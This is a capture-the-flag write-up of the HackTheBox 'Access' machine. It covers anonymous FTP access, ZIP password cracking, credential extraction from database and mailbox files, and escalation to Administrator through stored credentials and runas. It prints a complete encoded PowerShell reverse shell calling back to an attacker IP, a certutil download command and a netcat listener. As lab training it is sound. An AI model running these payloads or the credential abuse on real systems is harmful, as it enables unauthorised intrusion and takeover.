# Access

## Introduction

Welcome to my another writeup! In this HackTheBox [Access](https://app.hackthebox.com/machines/Access) machine, you'll learn: Enumerating FTP, privilege escalation via RunAs, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: `access\security` to `access\Administrator`](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Access.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|19:50:54(HKT)]
└> export RHOSTS=10.10.10.98
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|19:53:00(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet? syn-ack
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

According to `rustscan` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|21                | Microsoft ftpd                |
|23                | Telnet                        |
|80                | Microsoft IIS httpd 7.5       |

### FTP on Port 21

**Try `anonymous` (guest) login:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|19:53:00(HKT)]
└> ftp $RHOSTS  
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:siunam): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
```

We can login as `anonymous`!! And we can see there are 2 directory:

```shell
ftp> dir Backups
[...]
08-23-18  09:16PM              5652480 backup.mdb
[...]
ftp> dir Engineer
[...]
08-24-18  01:16AM                10870 Access Control.zip
```

Inside `Backups\` directory, there's a file called `backup.mdb`, in `Engineer\`, a file called `Access Control.zip` exisit.

**Let's `get` them:**
```shell
ftp> binary 
200 Type set to I.
ftp> cd Backups
250 CWD command successful.
ftp> get backup.mdb
[...]
ftp> cd ../Engineer
250 CWD command successful.
ftp> get Access\ Control.zip
[...]
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|19:58:09(HKT)]
└> file Access\ Control.zip backup.mdb 
Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
backup.mdb:         Microsoft Access Database
```

**`Access Control.zip`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:00:38(HKT)]
└> 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
ERROR: Wrong password : Access Control.pst
                         
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```

Ahh... It needs password to extract it.

**We could try to crack the password via `zip2john` and `john`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:01:24(HKT)]
└> zip2john Access\ Control.zip > access_control.hash
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:01:45(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt access_control.hash 
[...]
Session completed. 
```

But nope...

How about the `backup.mdb`? It's a Microsoft Access Database file.

**Let's transfer it to a Windows machine and open it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Pasted%20image%2020230526200937.png)

**In table `auth_user`, we can see some credentials:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Pasted%20image%2020230526201043.png)

We can save those credentials to a file for future use.

**Since the `Access Control.zip` is password protected, we can use the above password to crack it open:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:13:49(HKT)]
└> john --wordlist=password.txt access_control.hash 
[...]
{Redacted} (Access Control.zip/Access Control.pst)     
```

**Nice! We found the ZIP file's password! Let's unzip it!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:13:36(HKT)]
└> 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-7700 CPU @ 3.60GHz (906E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:14:00(HKT)]
└> file Access\ Control.pst 
Access Control.pst: Microsoft Outlook Personal Storage (>=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
```

It's a Microsoft Outlook Personal Storage file!

> An Outlook Data File (.pst) contains your messages and other Outlook items and is saved on your computer. POP accounts—which is a common type of account you can create when adding an email account from an internet service provider (ISP) like Xfinity or AT&T or Cox—download all of your email messages from your mail server and save them on your computer. (From [https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790](https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790))

**So, we can see read it's email messages via a Linux tool called `readpst`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:21:07(HKT)]
└> mkdir access_control_emails
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:21:21(HKT)]
└> readpst -D -M -b -e -o access_control_emails Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:21:41(HKT)]
└> ls -lah access_control_emails/Access\ Control/      
total 12K
drwxr-xr-x 2 siunam nam 4.0K May 26 20:21 .
drwxr-xr-x 3 siunam nam 4.0K May 26 20:21 ..
-rw-r--r-- 1 siunam nam 3.0K May 26 20:21 2.eml
```

**`2.eml`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:23:00(HKT)]
└> cat access_control_emails/Access\ Control/2.eml 
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
[...]
Hi there,

 

The password for the “security” account has been changed to {Redacted}.  Please ensure this is passed on to your engineers.

 

Regards,

John
[...]
```

Nice!! We found another credentials!

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|19:53:00(HKT)]
└> echo "$RHOSTS access.htb" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Pasted%20image%2020230526202550.png)

Nothing weird.

Then I tried to enumerate hidden directory and file in here, nothing weird.

## Initial Foothold

Armed with above information, we now gathered some credentials.

**Since Telnet service is opened, we can try to use the above credentials to login:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:25:03(HKT)]
└> telnet $RHOSTS --user=security
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.

Welcome to Microsoft Telnet Service 

password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami && ipconfig /all
access\security

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACCESS
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-B6-F5
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::34a7:e482:9766:c9c(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::34a7:e482:9766:c9c%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.98(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

I'm user `security` in host `access`!

**user.txt:**
```shell
C:\Users\security>cd desktop

C:\Users\security\Desktop>type user.txt
{Redacted}

C:\Users\security\Desktop>ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::34a7:e482:9766:c9c
   Link-local IPv6 Address . . . . . : fe80::34a7:e482:9766:c9c%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.98
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

## Privilege Escalation

### `access\security` to `access\Administrator`

Let's enumerate the machine!

**systeminfo:**
```shell
C:\Users\security\Desktop>systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
[...]
System Type:               x64-based PC
[...]
```
## Rooted

**root.txt:**
```shell
C:\Users\security\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
```

This machine is **x64 Windows Server 2008 R2 Standard 6.1.7600 N/A Build 7600**.

**Check `security` user:**
```shell
C:\Users\security\Desktop>whoami /all

USER INFORMATION
----------------

User Name       SID                                       
=============== ==========================================
access\security S-1-5-21-953262931-566350628-63446256-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                        Attributes                                        
====================================== ================ ========================================== ==================================================
Everyone                               Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group
ACCESS\TelnetClients                   Alias            S-1-5-21-953262931-566350628-63446256-1000 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4                                    Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Nothing weird.

**Check local users:**
```shell
C:\Users\security\Desktop>net user

User accounts for \\ACCESS

-------------------------------------------------------------------------------
Administrator            engineer                 Guest                    
security                 
```

**There are 2 local users: `engineer`, `security`.**

**Check user `engineer`:**
```shell
C:\Users\security\Desktop>net user "engineer"
User name                    engineer
Full Name                    engineer
[...]
Local Group Memberships      *Users                
Global Group memberships     *None                 
```

It's in the `Users` local group member.

**Check stored credentials on the machine:**
```shell
C:\Users\security\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

Oh! We found something.

***This machine stored user `Administrator`'s credentials!!***

Which means we can use `runas` to escalate our privilege to `Administrator`!!

To escalate our privilege to `Administrator`, we can:

- Transfer a reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Pasted%20image%2020230526205824.png)

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:57:22(HKT)]
└> cat revshell.ps1 
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:57:26(HKT)]
└> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
C:\Users\security\Desktop>certutil -urlcache -f http://10.10.14.26/revshell.ps1 revshell.ps1
[...]
C:\Users\security\Desktop>dir revshell.ps1
[...]
05/26/2023  01:56 PM             1,347 revshell.ps1
```

- Setup a `nc` listener:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:48:52(HKT)]
└> rlwrap -cAr nc -lnvp 443                                        
listening on [any] 443 ...
```

- Run the reverse shell payload:

```shell
runas /savecred /user:ACCESS\Administrator "powershell -nop -W hidden -noni -ep bypass C:\Users\security\Desktop\revshell.ps1"
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Access)-[2023.05.26|20:57:03(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.98] 49167

PS C:\Windows\system32> whoami;ipconfig /all
access\administrator

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACCESS
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-B6-F5
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::34a7:e482:9766:c9c(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::34a7:e482:9766:c9c%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.98(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

I'm user `administrator` in host `access`!

## Rooted

**root.txt:**
```shell
PS C:\Windows\system32> cd c:\users\administrator\desktop
PS C:\users\administrator\desktop> type root.txt
{Redacted}
PS C:\users\administrator\desktop> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::34a7:e482:9766:c9c
   Link-local IPv6 Address . . . . . : fe80::34a7:e482:9766:c9c%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.98
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{851F7B02-1B91-4636-BB2A-AAC45E5735BC}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Access/images/Pasted%20image%2020230526210334.png)

## Conclusion

What we've learned:

1. Enumerating FTP Via `anonymous` Login
2. Cracking ZIP Password Via `zip2john` & `john`
3. Vertical Privilege Escalation Via Stored Credentials In `cmdkey /list` & RunAs